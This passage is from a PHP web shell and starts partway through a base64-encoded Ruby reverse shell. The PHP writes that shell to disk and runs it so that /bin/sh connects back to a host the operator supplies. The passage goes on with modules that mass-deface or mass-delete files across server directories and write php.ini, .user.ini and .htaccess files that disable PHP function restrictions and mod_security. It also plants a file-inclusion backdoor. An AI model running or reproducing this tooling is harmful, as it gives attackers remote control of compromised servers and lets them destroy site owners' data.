QoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k");
$pbcaak=@fopen('bcruby.rb','w');
fwrite($pbcaak,$becaak);
$out2 = exe("ruby bcruby.rb ".$_POST['server']." ".$_POST['port']);
sleep(1);
echo "<pre>$out2\n".exe("ps aux | grep bcruby.rb")."</pre>";
unlink("bcruby.rb");
}
}

### MASS DEFACE ###
else if($_GET['ext'] == 'mass')
{
	echo "<center><form action=\"\" method=\"post\">\n";
	$dirr=$_POST['d_dir'];
	$index = $_POST["script"];
	$index = str_replace('"',"'",$index);
	$index = stripslashes($index);
	function edit_file($file,$index){
		if (is_writable($file)) {
		clear_fill($file,$index);
		echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
		} 
		else {
			echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
			}
			}
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	function clear_fill($file,$index){
		if(file_exists($file)){
			$handle = fopen($file,'w');
			fwrite($handle,'');
			fwrite($handle,$index);
			fclose($handle);  } }

	function gass(){
		global $dirr , $index ;
		chdir($dirr);
		$me = str_replace(dirname(__FILE__).'/','',__FILE__);
		$files = scandir($dirr) ;
		$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
		sort($files);
		$n = 0 ;
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
				edit_file($file,$index);
				flush();
				$n = $n +1 ;
				} 
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
					}
	function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
			}

			closedir($dh);
			return $files;
		}
	}
	function gass_all(){
		global $index ;
		$dirrall=$_POST['d_dir'];
		foreach (ListFiles($dirrall) as $key=>$file){
			$file = str_replace('//',"/",$file);
			echo "<center><strong>$file</strong> ===>";
			edit_file($file,$index);
			flush();
		}
		$key = $key+1;
	echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mass'] == 'onedir') {
		echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
		$ini="http://";
		$mainpath=$_POST[d_dir];
		$file=$_POST[d_file];
		$path=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){
		$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){
			echo"$ini$row/$file\n";
			}
		}
		echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
		$mainpath=$_POST[d_dir];$file=$_POST[d_file];
		$path=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
		}

	}
	elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
	elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
	elseif($_POST['mass'] == 'massdeface') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";	}
	else {
		echo "
		<center><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input type='text' name='d_dir' value='$dir' style='width: 450px; color: red; background: transparent;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input type='text' name='d_file' value='xD.htm' style='width: 450px; color: red; background: transparent;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' style='width: 450px; height: 200px; color: red; background: transparent;'>hacked by AnoaGhost</textarea><br>
		<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center>";
		}
}
### MYSQL INTERFACE ###
else if($_GET['bypass'] == 'killdiscfunc')
{
	echo "<div><center>Bypas Disable Function</div>";
		echo "<br><br><center>";
		echo "<form method=post><input type=submit name=ini value='php.ini' />&nbsp;<input type=submit name=userini value='.user.ini' />&nbsp;<input type=submit name=htce value='.htaccess' />&nbsp;<input type=submit name=litini value='Litespeed' /></form>";
		if(isset($_POST['ini']))
{
		$file = fopen("php.ini","w");
		echo fwrite($file,"disable_functions=none
safe_mode = Off
	");
		fclose($file);
		echo "<a href='php.ini'>click here!</a>";
}
		if(isset($_POST['userini']))
{
		$file = fopen(".user.ini","w");
		echo fwrite($file,"safe_mode = OFF
allow_url_fopen = ON
allow_url_include = ON
disable_functions = NONE
	");
		fclose($file);
		echo "<a href='php.ini'>click here!</a>";
}		if(isset($_POST['htce']))
{
		$file = fopen(".htaccess","w");
		echo fwrite($file,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>
	");
		fclose($file);
		echo "htaccess successfully created!";
}               if(isset($_POST['litini'])){
		$iniph = '<? n echo ini_get("safe_mode"); n echo ini_get("open_basedir"); n include($_GET["file"]); n ini_restore("safe_mode"); n ini_restore("open_basedir"); n echo ini_get("safe_mode"); n echo ini_get("open_basedir"); n include($_GET["ss"]; n ?>';
			 $byph = "safe_mode = Off n disable_functions= ";
		$comp="PEZpbGVzICoucGhwPg0KRm9yY2VUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtcGhwNA0KPC9GaWxlcz4=";
		file_put_contents("php.ini",base64_decode($byph));
		file_put_contents("ini.php",base64_decode($iniph));
		file_put_contents(".htaccess",base64_decode($comp));
		echo "<script>alert('Disable Functions in Litespeed Created'); hideAll();</script>";
		echo"</center>";
}
}
else if($_GET['kill'] == 'self') {
	if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('<center><br><center><h2>Shell removed</h2><br>Goodbye , Thanks for take my shell today</center></center>');
		else
			echo '<center>unlink failed!</center>';
}


### FOOTER ###
echo '<div class="footer">';
echo '<div id="nowtime"></div> &copy; <a href="//'. $_SERVER['REMOTE_ADDR'] .'" rel="nofollow" target="_blank">Valeiriya</a>';
echo '</div>';
echo '</div>
<script>
var d = new Date();
document.getElementById("nowtime").innerHTML = d.toDateString();
</script>';
 ?>
